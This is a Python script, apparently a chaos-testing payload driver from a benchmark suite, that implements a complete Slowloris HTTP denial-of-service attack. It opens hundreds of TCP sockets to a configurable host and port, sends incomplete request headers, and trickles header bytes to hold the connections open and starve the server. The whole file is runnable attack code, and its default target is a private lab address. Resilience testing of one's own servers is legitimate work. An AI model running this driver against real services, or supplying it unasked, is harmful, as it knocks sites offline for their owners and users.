"""
tools/benchmarks/sustained_realworld_matrix/payloads/drivers/chaos/slowloris_driver.py
Authentic Slowloris HTTP slow-header connection starvation attack driver.
Opens hundreds of live TCP sockets and periodically transmits single header bytes.
"""

import sys
import socket
import select
import argparse
from typing import List


def run_slowloris(target_host: str, target_port: int, num_conns: int = 500, delay_s: float = 5.0, duration_s: int = 60):
    sockets: List[socket.socket] = []
    print(f"[*] Initializing Slowloris attack against {target_host}:{target_port} with {num_conns} connections...")

    for i in range(num_conns):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4.0)
            s.connect((target_host, target_port))
            s.send(f"GET /?{i} HTTP/1.1\r\nUser-Agent: Slowloris-Matrix\r\n".encode("utf-8"))
            sockets.append(s)
        except Exception:
            pass

    print(f"[+] Established {len(sockets)} / {num_conns} Slowloris connections.")

    elapsed = 0.0
    while elapsed < duration_s and sockets:
        select.select([], [], [], delay_s)
        elapsed += delay_s
        alive = []
        for s in sockets:
            try:
                s.send(b"X-Slow-Header: keepalive\r\n")
                alive.append(s)
            except Exception:
                try:
                    s.close()
                except Exception:
                    pass
        sockets = alive
        print(f"[+] Active Slowloris connections: {len(sockets)}")

    for s in sockets:
        try:
            s.close()
        except Exception:
            pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="172.30.0.10")
    parser.add_argument("--port", type=int, default=8886)
    parser.add_argument("--connections", type=int, default=500)
    parser.add_argument("--delay", type=float, default=5.0)
    parser.add_argument("--duration", type=int, default=60)
    args = parser.parse_args()

    run_slowloris(args.host, args.port, args.connections, args.delay, args.duration)
